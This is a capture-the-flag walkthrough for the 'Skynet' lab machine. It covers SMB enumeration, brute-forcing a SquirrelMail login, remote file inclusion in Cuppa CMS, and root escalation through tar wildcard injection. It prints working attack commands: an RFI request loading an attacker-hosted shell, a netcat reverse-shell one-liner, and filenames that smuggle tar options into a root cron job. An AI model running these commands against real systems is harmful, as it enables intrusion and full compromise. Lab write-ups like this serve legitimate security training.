# Skynet

## Challenge Information
- **Challenge Name**: Skynet
- **Category**: Web Penetration Testing
- **Difficulty Level**: Easy

## Analysis

1. Lets scan the network first: `nmap -sV <ip_address>`. This shows some interesting results specially the samba shares. Lets enumerate it: `smbclient -L <ip_address> -N`. This shows some shares in which 2 seems to be interesting. Lets try to login for both of them:
```
smbclient //<ip_address>/anonymous -N
smbclient //<ip_address>/milesdyson -N
```
The second one denied the access but the first one got logged in. Lets enumerate the share. There is a file named **attention.txt** in which **miles** instructs the users to change their password. There is also a directory named **logs**. This directory contains 3 log files. Two of them are empty and one contains some words which seems to be passwords. Download this file using `get` command.

2. Now, we have a wordlist for the password and the username **milesdyson** is also known. But we do not have any page for the login for the email. So now lets enumerate some directories:
```
ffuf -u http://<ip_address>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -mc 200,301,302,403
```
This reveals only one directory that is accessible with status code 202: **squirrelmail**. So, lets open this directory, and boom! It opens a login page. Capture a login request in burpsuite and use intruder to brute force with the found log file. This will reveal the correct password: **cyborg007haloterminator**. Now login with this password to the milesdyson emails.

3. Open the first mail. There is new password given with some special characters. Lets try to login with this passowrd to the smb share of miles: `smbclient //<ip_address>/milesdyson -U milesdyson`. This command will prompt for the password. Use the following password: **)s{A&2Z=F^n_E.B`**. Now, we get logged into the miles share. Enumerate with `ls` command. Go to the **notes** directory. Again `ls` and then download the **important.txt** file. Read this file and it contains the hidden directory: **/45kra24zxs28v3yd**.

4. The vulnerability in which you can include a remote file for malicious purposes is called **remote file inclusion**.

5. Now, lets enumerate the hidden directory for more files:
```
ffuf -u http://<ip_address>/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -mc 200,301,302,403
```
This reveals another directory named **administrator**. Opening this directory opens a **Cupa CMS**. Lets find any vulnerability for RFI for this on exploit db, and we get an exploit with **EDB-ID 25971**.

6. Using this exploit explanation, we will use the following url to get a reverse shell:
```
curl http://<ip_address>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php\?urlConfig\=http://<your_ip>:8080/shell.php
```
Before this, host the shell.php file on a python server and start a netcat session as well. Running this command in the terminal will give you milesdyson shell. Retrieve the flag: `cat /home/milesdyson/user.txt`

7. Now that we have access as the user `milesdyson`, let’s check for any privilege escalation possibilities. One of the first things to look at is scheduled **cron jobs**, especially those running as root. Check the crontab: `cat /etc/crontab`. This reveals an interesting job running every minute: `*/1 * * * * root /home/milesdyson/backups/backup.sh`. This tells us that a script named `backup.sh` is being executed **every minute** by the **root user**.

8. Let’s examine the contents and permissions of this script:
```bash
ls -l /home/milesdyson/backups/backup.sh
cat /home/milesdyson/backups/backup.sh
```
The script contains:
```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
This script archives everything inside `/var/www/html` using the `tar` command. And here's the **key observation** — the script uses a wildcard `*`, which means it processes **all files in the directory**. If we can inject specially crafted **filename-based options**, we can control how `tar` behaves.

9. This is a known exploitation technique of the `tar` command involving `--checkpoint` and `--checkpoint-action` options.
First, create a malicious reverse shell script:
```bash
echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <your_ip> 1234 > /tmp/f' > /var/www/html/shell.sh
chmod +x /var/www/html/shell.sh
```
Replace `<your_ip>` with your attacker machine's IP. Next, create two special files that will be interpreted by `tar` as options:
```bash
touch "/var/www/html/--checkpoint=1"
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
```
When the cron job runs, `tar` will hit these option-like filenames and **execute the `shell.sh` script as root**, giving us a reverse shell.

10. Now, on your attacking machine, start a listener: `nc -lvnp 1234`. Wait for the cron job to run (within a minute), and you should receive a **root shell**.

11. Finally, retrieve the root flag: `cat /root/root.txt`

---
